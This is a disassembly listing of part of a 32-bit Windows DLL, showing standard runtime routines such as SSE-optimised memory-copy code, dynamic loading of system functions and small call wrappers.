10003862:	75 dd                	jne    0x10003841
10003864:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
1000386a:	74 15                	je     0x10003881
1000386c:	83 ef 04             	sub    $0x4,%edi
1000386f:	83 ee 04             	sub    $0x4,%esi
10003872:	8b 06                	mov    (%esi),%eax
10003874:	89 07                	mov    %eax,(%edi)
10003876:	83 e9 04             	sub    $0x4,%ecx
10003879:	f7 c1 fc ff ff ff    	test   $0xfffffffc,%ecx
1000387f:	75 eb                	jne    0x1000386c
10003881:	85 c9                	test   %ecx,%ecx
10003883:	74 0f                	je     0x10003894
10003885:	83 ef 01             	sub    $0x1,%edi
10003888:	83 ee 01             	sub    $0x1,%esi
1000388b:	8a 06                	mov    (%esi),%al
1000388d:	88 07                	mov    %al,(%edi)
1000388f:	83 e9 01             	sub    $0x1,%ecx
10003892:	75 f1                	jne    0x10003885
10003894:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003898:	5e                   	pop    %esi
10003899:	5f                   	pop    %edi
1000389a:	c3                   	ret
1000389b:	eb 03                	jmp    0x100038a0
1000389d:	cc                   	int3
1000389e:	cc                   	int3
1000389f:	cc                   	int3
100038a0:	8b c6                	mov    %esi,%eax
100038a2:	83 e0 0f             	and    $0xf,%eax
100038a5:	85 c0                	test   %eax,%eax
100038a7:	0f 85 e3 00 00 00    	jne    0x10003990
100038ad:	8b d1                	mov    %ecx,%edx
100038af:	83 e1 7f             	and    $0x7f,%ecx
100038b2:	c1 ea 07             	shr    $0x7,%edx
100038b5:	74 66                	je     0x1000391d
100038b7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
100038be:	8b ff                	mov    %edi,%edi
100038c0:	66 0f 6f 06          	movdqa (%esi),%xmm0
100038c4:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
100038c9:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
100038ce:	66 0f 6f 5e 30       	movdqa 0x30(%esi),%xmm3
100038d3:	66 0f 7f 07          	movdqa %xmm0,(%edi)
100038d7:	66 0f 7f 4f 10       	movdqa %xmm1,0x10(%edi)
100038dc:	66 0f 7f 57 20       	movdqa %xmm2,0x20(%edi)
100038e1:	66 0f 7f 5f 30       	movdqa %xmm3,0x30(%edi)
100038e6:	66 0f 6f 66 40       	movdqa 0x40(%esi),%xmm4
100038eb:	66 0f 6f 6e 50       	movdqa 0x50(%esi),%xmm5
100038f0:	66 0f 6f 76 60       	movdqa 0x60(%esi),%xmm6
100038f5:	66 0f 6f 7e 70       	movdqa 0x70(%esi),%xmm7
100038fa:	66 0f 7f 67 40       	movdqa %xmm4,0x40(%edi)
100038ff:	66 0f 7f 6f 50       	movdqa %xmm5,0x50(%edi)
10003904:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
10003909:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
1000390e:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
10003914:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
1000391a:	4a                   	dec    %edx
1000391b:	75 a3                	jne    0x100038c0
1000391d:	85 c9                	test   %ecx,%ecx
1000391f:	74 5f                	je     0x10003980
10003921:	8b d1                	mov    %ecx,%edx
10003923:	c1 ea 05             	shr    $0x5,%edx
10003926:	85 d2                	test   %edx,%edx
10003928:	74 21                	je     0x1000394b
1000392a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
10003930:	f3 0f 6f 06          	movdqu (%esi),%xmm0
10003934:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
10003939:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
1000393d:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
10003942:	8d 76 20             	lea    0x20(%esi),%esi
10003945:	8d 7f 20             	lea    0x20(%edi),%edi
10003948:	4a                   	dec    %edx
10003949:	75 e5                	jne    0x10003930
1000394b:	83 e1 1f             	and    $0x1f,%ecx
1000394e:	74 30                	je     0x10003980
10003950:	8b c1                	mov    %ecx,%eax
10003952:	c1 e9 02             	shr    $0x2,%ecx
10003955:	74 0f                	je     0x10003966
10003957:	8b 16                	mov    (%esi),%edx
10003959:	89 17                	mov    %edx,(%edi)
1000395b:	83 c7 04             	add    $0x4,%edi
1000395e:	83 c6 04             	add    $0x4,%esi
10003961:	83 e9 01             	sub    $0x1,%ecx
10003964:	75 f1                	jne    0x10003957
10003966:	8b c8                	mov    %eax,%ecx
10003968:	83 e1 03             	and    $0x3,%ecx
1000396b:	74 13                	je     0x10003980
1000396d:	8a 06                	mov    (%esi),%al
1000396f:	88 07                	mov    %al,(%edi)
10003971:	46                   	inc    %esi
10003972:	47                   	inc    %edi
10003973:	49                   	dec    %ecx
10003974:	75 f7                	jne    0x1000396d
10003976:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000397d:	8d 49 00             	lea    0x0(%ecx),%ecx
10003980:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003984:	5e                   	pop    %esi
10003985:	5f                   	pop    %edi
10003986:	c3                   	ret
10003987:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
1000398e:	8b ff                	mov    %edi,%edi
10003990:	ba 10 00 00 00       	mov    $0x10,%edx
10003995:	2b d0                	sub    %eax,%edx
10003997:	2b ca                	sub    %edx,%ecx
10003999:	51                   	push   %ecx
1000399a:	8b c2                	mov    %edx,%eax
1000399c:	8b c8                	mov    %eax,%ecx
1000399e:	83 e1 03             	and    $0x3,%ecx
100039a1:	74 09                	je     0x100039ac
100039a3:	8a 16                	mov    (%esi),%dl
100039a5:	88 17                	mov    %dl,(%edi)
100039a7:	46                   	inc    %esi
100039a8:	47                   	inc    %edi
100039a9:	49                   	dec    %ecx
100039aa:	75 f7                	jne    0x100039a3
100039ac:	c1 e8 02             	shr    $0x2,%eax
100039af:	74 0d                	je     0x100039be
100039b1:	8b 16                	mov    (%esi),%edx
100039b3:	89 17                	mov    %edx,(%edi)
100039b5:	8d 76 04             	lea    0x4(%esi),%esi
100039b8:	8d 7f 04             	lea    0x4(%edi),%edi
100039bb:	48                   	dec    %eax
100039bc:	75 f3                	jne    0x100039b1
100039be:	59                   	pop    %ecx
100039bf:	e9 e9 fe ff ff       	jmp    0x100038ad
100039c4:	55                   	push   %ebp
100039c5:	8b ec                	mov    %esp,%ebp
100039c7:	51                   	push   %ecx
100039c8:	53                   	push   %ebx
100039c9:	56                   	push   %esi
100039ca:	57                   	push   %edi
100039cb:	8b 7d 08             	mov    0x8(%ebp),%edi
100039ce:	eb 6f                	jmp    0x10003a3f
100039d0:	8b 07                	mov    (%edi),%eax
100039d2:	8d 1c 85 f4 40 01 10 	lea    0x100140f4(,%eax,4),%ebx
100039d9:	8b 33                	mov    (%ebx),%esi
100039db:	85 f6                	test   %esi,%esi
100039dd:	74 07                	je     0x100039e6
100039df:	83 fe ff             	cmp    $0xffffffff,%esi
100039e2:	75 76                	jne    0x10003a5a
100039e4:	eb 56                	jmp    0x10003a3c
100039e6:	8b 04 85 b8 db 00 10 	mov    0x1000dbb8(,%eax,4),%eax
100039ed:	68 00 08 00 00       	push   $0x800
100039f2:	6a 00                	push   $0x0
100039f4:	50                   	push   %eax
100039f5:	89 45 fc             	mov    %eax,-0x4(%ebp)
100039f8:	ff 15 c0 d0 00 10    	call   *0x1000d0c0
100039fe:	8b f0                	mov    %eax,%esi
10003a00:	85 f6                	test   %esi,%esi
10003a02:	75 47                	jne    0x10003a4b
10003a04:	ff 15 40 d0 00 10    	call   *0x1000d040
10003a0a:	83 f8 57             	cmp    $0x57,%eax
10003a0d:	75 28                	jne    0x10003a37
10003a0f:	8b 75 fc             	mov    -0x4(%ebp),%esi
10003a12:	6a 07                	push   $0x7
10003a14:	68 50 dc 00 10       	push   $0x1000dc50
10003a19:	56                   	push   %esi
10003a1a:	e8 54 19 00 00       	call   0x10005373
10003a1f:	83 c4 0c             	add    $0xc,%esp
10003a22:	85 c0                	test   %eax,%eax
10003a24:	74 11                	je     0x10003a37
10003a26:	6a 00                	push   $0x0
10003a28:	6a 00                	push   $0x0
10003a2a:	56                   	push   %esi
10003a2b:	ff 15 c0 d0 00 10    	call   *0x1000d0c0
10003a31:	8b f0                	mov    %eax,%esi
10003a33:	85 f6                	test   %esi,%esi
10003a35:	75 14                	jne    0x10003a4b
10003a37:	83 c8 ff             	or     $0xffffffff,%eax
10003a3a:	87 03                	xchg   %eax,(%ebx)
10003a3c:	83 c7 04             	add    $0x4,%edi
10003a3f:	3b 7d 0c             	cmp    0xc(%ebp),%edi
10003a42:	75 8c                	jne    0x100039d0
10003a44:	33 c0                	xor    %eax,%eax
10003a46:	5f                   	pop    %edi
10003a47:	5e                   	pop    %esi
10003a48:	5b                   	pop    %ebx
10003a49:	c9                   	leave
10003a4a:	c3                   	ret
10003a4b:	8b c6                	mov    %esi,%eax
10003a4d:	87 03                	xchg   %eax,(%ebx)
10003a4f:	85 c0                	test   %eax,%eax
10003a51:	74 07                	je     0x10003a5a
10003a53:	56                   	push   %esi
10003a54:	ff 15 b8 d0 00 10    	call   *0x1000d0b8
10003a5a:	8b c6                	mov    %esi,%eax
10003a5c:	eb e8                	jmp    0x10003a46
10003a5e:	55                   	push   %ebp
10003a5f:	8b ec                	mov    %esp,%ebp
10003a61:	8b 45 08             	mov    0x8(%ebp),%eax
10003a64:	56                   	push   %esi
10003a65:	57                   	push   %edi
10003a66:	8d 3c 85 00 41 01 10 	lea    0x10014100(,%eax,4),%edi
10003a6d:	8b 07                	mov    (%edi),%eax
10003a6f:	83 ce ff             	or     $0xffffffff,%esi
10003a72:	3b c6                	cmp    %esi,%eax
10003a74:	74 2b                	je     0x10003aa1
10003a76:	85 c0                	test   %eax,%eax
10003a78:	75 29                	jne    0x10003aa3
10003a7a:	ff 75 14             	push   0x14(%ebp)
10003a7d:	ff 75 10             	push   0x10(%ebp)
10003a80:	e8 3f ff ff ff       	call   0x100039c4
10003a85:	59                   	pop    %ecx
10003a86:	59                   	pop    %ecx
10003a87:	85 c0                	test   %eax,%eax
10003a89:	74 14                	je     0x10003a9f
10003a8b:	ff 75 0c             	push   0xc(%ebp)
10003a8e:	50                   	push   %eax
10003a8f:	ff 15 bc d0 00 10    	call   *0x1000d0bc
10003a95:	85 c0                	test   %eax,%eax
10003a97:	74 06                	je     0x10003a9f
10003a99:	8b c8                	mov    %eax,%ecx
10003a9b:	87 0f                	xchg   %ecx,(%edi)
10003a9d:	eb 04                	jmp    0x10003aa3
10003a9f:	87 37                	xchg   %esi,(%edi)
10003aa1:	33 c0                	xor    %eax,%eax
10003aa3:	5f                   	pop    %edi
10003aa4:	5e                   	pop    %esi
10003aa5:	5d                   	pop    %ebp
10003aa6:	c3                   	ret
10003aa7:	55                   	push   %ebp
10003aa8:	8b ec                	mov    %esp,%ebp
10003aaa:	56                   	push   %esi
10003aab:	68 68 dc 00 10       	push   $0x1000dc68
10003ab0:	68 60 dc 00 10       	push   $0x1000dc60
10003ab5:	68 68 dc 00 10       	push   $0x1000dc68
10003aba:	6a 00                	push   $0x0
10003abc:	e8 9d ff ff ff       	call   0x10003a5e
10003ac1:	8b f0                	mov    %eax,%esi
10003ac3:	83 c4 10             	add    $0x10,%esp
10003ac6:	85 f6                	test   %esi,%esi
10003ac8:	74 10                	je     0x10003ada
10003aca:	ff 75 08             	push   0x8(%ebp)
10003acd:	8b ce                	mov    %esi,%ecx
10003acf:	ff 15 5c d1 00 10    	call   *0x1000d15c
10003ad5:	ff d6                	call   *%esi
10003ad7:	5e                   	pop    %esi
10003ad8:	5d                   	pop    %ebp
10003ad9:	c3                   	ret
10003ada:	5e                   	pop    %esi
10003adb:	5d                   	pop    %ebp
10003adc:	ff 25 a8 d0 00 10    	jmp    *0x1000d0a8
10003ae2:	55                   	push   %ebp
10003ae3:	8b ec                	mov    %esp,%ebp
10003ae5:	56                   	push   %esi
10003ae6:	68 7c dc 00 10       	push   $0x1000dc7c
10003aeb:	68 74 dc 00 10       	push   $0x1000dc74
10003af0:	68 7c dc 00 10       	push   $0x1000dc7c
10003af5:	6a 01                	push   $0x1
10003af7:	e8 62 ff ff ff       	call   0x10003a5e
10003afc:	83 c4 10             	add    $0x10,%esp
10003aff:	8b f0                	mov    %eax,%esi
10003b01:	ff 75 08             	push   0x8(%ebp)
10003b04:	85 f6                	test   %esi,%esi
10003b06:	74 0c                	je     0x10003b14
10003b08:	8b ce                	mov    %esi,%ecx
10003b0a:	ff 15 5c d1 00 10    	call   *0x1000d15c
10003b10:	ff d6                	call   *%esi
10003b12:	eb 06                	jmp    0x10003b1a
10003b14:	ff 15 b4 d0 00 10    	call   *0x1000d0b4
10003b1a:	5e                   	pop    %esi
10003b1b:	5d                   	pop    %ebp
10003b1c:	c3                   	ret
10003b1d:	55                   	push   %ebp
10003b1e:	8b ec                	mov    %esp,%ebp
10003b20:	56                   	push   %esi
10003b21:	68 8c dc 00 10       	push   $0x1000dc8c
10003b26:	68 84 dc 00 10       	push   $0x1000dc84
10003b2b:	68 8c dc 00 10       	push   $0x1000dc8c
10003b30:	6a 02                	push   $0x2
10003b32:	e8 27 ff ff ff       	call   0x10003a5e
10003b37:	83 c4 10             	add    $0x10,%esp
10003b3a:	8b f0                	mov    %eax,%esi
10003b3c:	ff 75 08             	push   0x8(%ebp)
10003b3f:	85 f6                	test   %esi,%esi
10003b41:	74 0c                	je     0x10003b4f
10003b43:	8b ce                	mov    %esi,%ecx
10003b45:	ff 15 5c d1 00 10    	call   *0x1000d15c
10003b4b:	ff d6                	call   *%esi
10003b4d:	eb 06                	jmp    0x10003b55
10003b4f:	ff 15 00 d0 00 10    	call   *0x1000d000
10003b55:	5e                   	pop    %esi
10003b56:	5d                   	pop    %ebp
10003b57:	c3                   	ret
10003b58:	55                   	push   %ebp
10003b59:	8b ec                	mov    %esp,%ebp
10003b5b:	56                   	push   %esi
10003b5c:	68 a0 dc 00 10       	push   $0x1000dca0
10003b61:	68 98 dc 00 10       	push   $0x1000dc98
10003b66:	68 a0 dc 00 10       	push   $0x1000dca0
10003b6b:	6a 03                	push   $0x3
10003b6d:	e8 ec fe ff ff       	call   0x10003a5e
10003b72:	83 c4 10             	add    $0x10,%esp
10003b75:	8b f0                	mov    %eax,%esi
10003b77:	ff 75 0c             	push   0xc(%ebp)
10003b7a:	ff 75 08             	push   0x8(%ebp)
10003b7d:	85 f6                	test   %esi,%esi
10003b7f:	74 0c                	je     0x10003b8d
10003b81:	8b ce                	mov    %esi,%ecx
10003b83:	ff 15 5c d1 00 10    	call   *0x1000d15c
10003b89:	ff d6                	call   *%esi
10003b8b:	eb 06                	jmp    0x10003b93
10003b8d:	ff 15 b0 d0 00 10    	call   *0x1000d0b0
10003b93:	5e                   	pop    %esi
10003b94:	5d                   	pop    %ebp
10003b95:	c3                   	ret
10003b96:	55                   	push   %ebp
10003b97:	8b ec                	mov    %esp,%ebp
10003b99:	56                   	push   %esi
10003b9a:	68 b4 dc 00 10       	push   $0x1000dcb4
10003b9f:	68 ac dc 00 10       	push   $0x1000dcac
10003ba4:	68 b4 dc 00 10       	push   $0x1000dcb4
10003ba9:	6a 04                	push   $0x4
10003bab:	e8 ae fe ff ff       	call   0x10003a5e
10003bb0:	8b f0                	mov    %eax,%esi
10003bb2:	83 c4 10             	add    $0x10,%esp
10003bb5:	85 f6                	test   %esi,%esi
10003bb7:	74 15                	je     0x10003bce
10003bb9:	ff 75 10             	push   0x10(%ebp)
10003bbc:	8b ce                	mov    %esi,%ecx
10003bbe:	ff 75 0c             	push   0xc(%ebp)
10003bc1:	ff 75 08             	push   0x8(%ebp)
10003bc4:	ff 15 5c d1 00 10    	call   *0x1000d15c
10003bca:	ff d6                	call   *%esi
10003bcc:	eb 0c                	jmp    0x10003bda
10003bce:	ff 75 0c             	push   0xc(%ebp)
10003bd1:	ff 75 08             	push   0x8(%ebp)
10003bd4:	ff 15 a4 d0 00 10    	call   *0x1000d0a4
10003bda:	5e                   	pop    %esi
10003bdb:	5d                   	pop    %ebp
10003bdc:	c3                   	ret
10003bdd:	cc                   	int3
10003bde:	cc                   	int3
10003bdf:	cc                   	int3
10003be0:	55                   	push   %ebp
10003be1:	8b ec                	mov    %esp,%ebp
10003be3:	83 ec 04             	sub    $0x4,%esp
10003be6:	53                   	push   %ebx
10003be7:	51                   	push   %ecx
10003be8:	8b 45 0c             	mov    0xc(%ebp),%eax
10003beb:	83 c0 0c             	add    $0xc,%eax
10003bee:	89 45 fc             	mov    %eax,-0x4(%ebp)
10003bf1:	8b 45 08             	mov    0x8(%ebp),%eax
10003bf4:	55                   	push   %ebp
10003bf5:	ff 75 10             	push   0x10(%ebp)
10003bf8:	8b 4d 10             	mov    0x10(%ebp),%ecx
10003bfb:	8b 6d fc             	mov    -0x4(%ebp),%ebp
10003bfe:	e8 1d f8 ff ff       	call   0x10003420
10003c03:	56                   	push   %esi
10003c04:	57                   	push   %edi
10003c05:	ff d0                	call   *%eax
10003c07:	5f                   	pop    %edi
10003c08:	5e                   	pop    %esi
10003c09:	8b dd                	mov    %ebp,%ebx
10003c0b:	5d                   	pop    %ebp
10003c0c:	8b 4d 10             	mov    0x10(%ebp),%ecx
10003c0f:	55                   	push   %ebp
10003c10:	8b eb                	mov    %ebx,%ebp
10003c12:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
10003c18:	75 05                	jne    0x10003c1f
10003c1a:	b9 02 00 00 00       	mov    $0x2,%ecx
10003c1f:	51                   	push   %ecx
10003c20:	e8 fb f7 ff ff       	call   0x10003420
10003c25:	5d                   	pop    %ebp
10003c26:	59                   	pop    %ecx
10003c27:	5b                   	pop    %ebx
10003c28:	c9                   	leave
10003c29:	c2 0c 00             	ret    $0xc
10003c2c:	cc                   	int3
10003c2d:	cc                   	int3
10003c2e:	cc                   	int3
10003c2f:	cc                   	int3
10003c30:	57                   	push   %edi
10003c31:	56                   	push   %esi
10003c32:	8b 74 24 10          	mov    0x10(%esp),%esi
10003c36:	8b 4c 24 14          	mov    0x14(%esp),%ecx
10003c3a:	8b 7c 24 0c          	mov    0xc(%esp),%edi
10003c3e:	8b c1                	mov    %ecx,%eax
10003c40:	8b d1                	mov    %ecx,%edx
10003c42:	03 c6                	add    %esi,%eax
10003c44:	3b fe                	cmp    %esi,%edi
10003c46:	76 08                	jbe    0x10003c50
10003c48:	3b f8                	cmp    %eax,%edi
10003c4a:	0f 82 94 02 00 00    	jb     0x10003ee4
10003c50:	83 f9 20             	cmp    $0x20,%ecx
10003c53:	0f 82 d2 04 00 00    	jb     0x1000412b
10003c59:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
10003c5f:	73 13                	jae    0x10003c74
10003c61:	0f ba 25 10 30 01 10 	btl    $0x1,0x10013010
10003c68:	01 
10003c69:	0f 82 8e 04 00 00    	jb     0x100040fd
10003c6f:	e9 e3 01 00 00       	jmp    0x10003e57
10003c74:	0f ba 25 6c 40 01 10 	btl    $0x1,0x1001406c
10003c7b:	01 
10003c7c:	73 09                	jae    0x10003c87
10003c7e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
10003c80:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003c84:	5e                   	pop    %esi
10003c85:	5f                   	pop    %edi
10003c86:	c3                   	ret
10003c87:	8b c7                	mov    %edi,%eax
10003c89:	33 c6                	xor    %esi,%eax
10003c8b:	a9 0f 00 00 00       	test   $0xf,%eax
10003c90:	75 0e                	jne    0x10003ca0
10003c92:	0f ba 25 10 30 01 10 	btl    $0x1,0x10013010
10003c99:	01 
10003c9a:	0f 82 e0 03 00 00    	jb     0x10004080
10003ca0:	0f ba 25 6c 40 01 10 	btl    $0x0,0x1001406c
10003ca7:	00 
10003ca8:	0f 83 a9 01 00 00    	jae    0x10003e57
10003cae:	f7 c7 03 00 00 00    	test   $0x3,%edi
10003cb4:	0f 85 9d 01 00 00    	jne    0x10003e57
10003cba:	f7 c6 03 00 00 00    	test   $0x3,%esi
10003cc0:	0f 85 ac 01 00 00    	jne    0x10003e72
10003cc6:	0f ba e7 02          	bt     $0x2,%edi
10003cca:	73 0d                	jae    0x10003cd9
10003ccc:	8b 06                	mov    (%esi),%eax
10003cce:	83 e9 04             	sub    $0x4,%ecx
10003cd1:	8d 76 04             	lea    0x4(%esi),%esi
10003cd4:	89 07                	mov    %eax,(%edi)
10003cd6:	8d 7f 04             	lea    0x4(%edi),%edi
10003cd9:	0f ba e7 03          	bt     $0x3,%edi
10003cdd:	73 11                	jae    0x10003cf0
10003cdf:	f3 0f 7e 0e          	movq   (%esi),%xmm1
10003ce3:	83 e9 08             	sub    $0x8,%ecx
10003ce6:	8d 76 08             	lea    0x8(%esi),%esi
10003ce9:	66 0f d6 0f          	movq   %xmm1,(%edi)
10003ced:	8d 7f 08             	lea    0x8(%edi),%edi
10003cf0:	f7 c6 07 00 00 00    	test   $0x7,%esi
10003cf6:	74 65                	je     0x10003d5d
10003cf8:	0f ba e6 03          	bt     $0x3,%esi
10003cfc:	0f 83 b4 00 00 00    	jae    0x10003db6
10003d02:	66 0f 6f 4e f4       	movdqa -0xc(%esi),%xmm1
10003d07:	8d 76 f4             	lea    -0xc(%esi),%esi
10003d0a:	8b ff                	mov    %edi,%edi
10003d0c:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
10003d11:	83 e9 30             	sub    $0x30,%ecx
10003d14:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
10003d19:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
10003d1e:	8d 76 30             	lea    0x30(%esi),%esi
10003d21:	83 f9 30             	cmp    $0x30,%ecx
10003d24:	66 0f 6f d3          	movdqa %xmm3,%xmm2
10003d28:	66 0f 3a 0f d9 0c    	palignr $0xc,%xmm1,%xmm3
10003d2e:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
10003d32:	66 0f 6f e0          	movdqa %xmm0,%xmm4
10003d36:	66 0f 3a 0f c2 0c    	palignr $0xc,%xmm2,%xmm0
10003d3c:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
10003d41:	66 0f 6f cd          	movdqa %xmm5,%xmm1
10003d45:	66 0f 3a 0f ec 0c    	palignr $0xc,%xmm4,%xmm5
10003d4b:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
10003d50:	8d 7f 30             	lea    0x30(%edi),%edi
10003d53:	73 b7                	jae    0x10003d0c
10003d55:	8d 76 0c             	lea    0xc(%esi),%esi
10003d58:	e9 af 00 00 00       	jmp    0x10003e0c
10003d5d:	66 0f 6f 4e f8       	movdqa -0x8(%esi),%xmm1
10003d62:	8d 76 f8             	lea    -0x8(%esi),%esi
10003d65:	8d 49 00             	lea    0x0(%ecx),%ecx
10003d68:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
10003d6d:	83 e9 30             	sub    $0x30,%ecx
10003d70:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
10003d75:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
10003d7a:	8d 76 30             	lea    0x30(%esi),%esi
10003d7d:	83 f9 30             	cmp    $0x30,%ecx
10003d80:	66 0f 6f d3          	movdqa %xmm3,%xmm2
10003d84:	66 0f 3a 0f d9 08    	palignr $0x8,%xmm1,%xmm3
10003d8a:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
10003d8e:	66 0f 6f e0          	movdqa %xmm0,%xmm4
10003d92:	66 0f 3a 0f c2 08    	palignr $0x8,%xmm2,%xmm0
10003d98:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
10003d9d:	66 0f 6f cd          	movdqa %xmm5,%xmm1
10003da1:	66 0f 3a 0f ec 08    	palignr $0x8,%xmm4,%xmm5
10003da7:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
10003dac:	8d 7f 30             	lea    0x30(%edi),%edi
10003daf:	73 b7                	jae    0x10003d68
10003db1:	8d 76 08             	lea    0x8(%esi),%esi
10003db4:	eb 56                	jmp    0x10003e0c
10003db6:	66 0f 6f 4e fc       	movdqa -0x4(%esi),%xmm1
10003dbb:	8d 76 fc             	lea    -0x4(%esi),%esi
10003dbe:	8b ff                	mov    %edi,%edi
10003dc0:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
10003dc5:	83 e9 30             	sub    $0x30,%ecx
10003dc8:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
10003dcd:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
10003dd2:	8d 76 30             	lea    0x30(%esi),%esi
10003dd5:	83 f9 30             	cmp    $0x30,%ecx
10003dd8:	66 0f 6f d3          	movdqa %xmm3,%xmm2
10003ddc:	66 0f 3a 0f d9 04    	palignr $0x4,%xmm1,%xmm3
10003de2:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
10003de6:	66 0f 6f e0          	movdqa %xmm0,%xmm4
10003dea:	66 0f 3a 0f c2 04    	palignr $0x4,%xmm2,%xmm0
10003df0:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
10003df5:	66 0f 6f cd          	movdqa %xmm5,%xmm1
10003df9:	66 0f 3a 0f ec 04    	palignr $0x4,%xmm4,%xmm5
10003dff:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
10003e04:	8d 7f 30             	lea    0x30(%edi),%edi
10003e07:	73 b7                	jae    0x10003dc0
10003e09:	8d 76 04             	lea    0x4(%esi),%esi
10003e0c:	83 f9 10             	cmp    $0x10,%ecx
10003e0f:	72 13                	jb     0x10003e24
10003e11:	f3 0f 6f 0e          	movdqu (%esi),%xmm1
10003e15:	83 e9 10             	sub    $0x10,%ecx
10003e18:	8d 76 10             	lea    0x10(%esi),%esi
10003e1b:	66 0f 7f 0f          	movdqa %xmm1,(%edi)
10003e1f:	8d 7f 10             	lea    0x10(%edi),%edi
10003e22:	eb e8                	jmp    0x10003e0c
10003e24:	0f ba e1 02          	bt     $0x2,%ecx
10003e28:	73 0d                	jae    0x10003e37
10003e2a:	8b 06                	mov    (%esi),%eax
10003e2c:	83 e9 04             	sub    $0x4,%ecx
10003e2f:	8d 76 04             	lea    0x4(%esi),%esi
10003e32:	89 07                	mov    %eax,(%edi)
10003e34:	8d 7f 04             	lea    0x4(%edi),%edi
10003e37:	0f ba e1 03          	bt     $0x3,%ecx
10003e3b:	73 11                	jae    0x10003e4e
10003e3d:	f3 0f 7e 0e          	movq   (%esi),%xmm1
10003e41:	83 e9 08             	sub    $0x8,%ecx
10003e44:	8d 76 08             	lea    0x8(%esi),%esi
10003e47:	66 0f d6 0f          	movq   %xmm1,(%edi)
10003e4b:	8d 7f 08             	lea    0x8(%edi),%edi
10003e4e:	8b 04 8d 94 3e 00 10 	mov    0x10003e94(,%ecx,4),%eax
10003e55:	ff e0                	jmp    *%eax
10003e57:	f7 c7 03 00 00 00    	test   $0x3,%edi
10003e5d:	74 13                	je     0x10003e72
10003e5f:	8a 06                	mov    (%esi),%al
10003e61:	88 07                	mov    %al,(%edi)
10003e63:	49                   	dec    %ecx
10003e64:	83 c6 01             	add    $0x1,%esi
10003e67:	83 c7 01             	add    $0x1,%edi
10003e6a:	f7 c7 03 00 00 00    	test   $0x3,%edi
10003e70:	75 ed                	jne    0x10003e5f
10003e72:	8b d1                	mov    %ecx,%edx
10003e74:	83 f9 20             	cmp    $0x20,%ecx
10003e77:	0f 82 ae 02 00 00    	jb     0x1000412b
10003e7d:	c1 e9 02             	shr    $0x2,%ecx
10003e80:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
10003e82:	83 e2 03             	and    $0x3,%edx
10003e85:	ff 24 95 94 3e 00 10 	jmp    *0x10003e94(,%edx,4)
10003e8c:	ff 24 8d a4 3e 00 10 	jmp    *0x10003ea4(,%ecx,4)
10003e93:	90                   	nop
10003e94:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10003e95:	3e 00 10             	add    %dl,%ds:(%eax)
10003e98:	ac                   	lods   %ds:(%esi),%al
10003e99:	3e 00 10             	add    %dl,%ds:(%eax)
10003e9c:	b8 3e 00 10 cc       	mov    $0xcc10003e,%eax
10003ea1:	3e 00 10             	add    %dl,%ds:(%eax)
10003ea4:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003ea8:	5e                   	pop    %esi
10003ea9:	5f                   	pop    %edi
10003eaa:	c3                   	ret
10003eab:	90                   	nop
10003eac:	8a 06                	mov    (%esi),%al
10003eae:	88 07                	mov    %al,(%edi)
10003eb0:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003eb4:	5e                   	pop    %esi
10003eb5:	5f                   	pop    %edi
10003eb6:	c3                   	ret
10003eb7:	90                   	nop
10003eb8:	8a 06                	mov    (%esi),%al
10003eba:	88 07                	mov    %al,(%edi)
10003ebc:	8a 46 01             	mov    0x1(%esi),%al
10003ebf:	88 47 01             	mov    %al,0x1(%edi)
10003ec2:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003ec6:	5e                   	pop    %esi
10003ec7:	5f                   	pop    %edi
10003ec8:	c3                   	ret
10003ec9:	8d 49 00             	lea    0x0(%ecx),%ecx
10003ecc:	8a 06                	mov    (%esi),%al
10003ece:	88 07                	mov    %al,(%edi)
10003ed0:	8a 46 01             	mov    0x1(%esi),%al
10003ed3:	88 47 01             	mov    %al,0x1(%edi)
10003ed6:	8a 46 02             	mov    0x2(%esi),%al
10003ed9:	88 47 02             	mov    %al,0x2(%edi)
10003edc:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003ee0:	5e                   	pop    %esi
10003ee1:	5f                   	pop    %edi
10003ee2:	c3                   	ret
10003ee3:	90                   	nop
10003ee4:	8d 34 0e             	lea    (%esi,%ecx,1),%esi
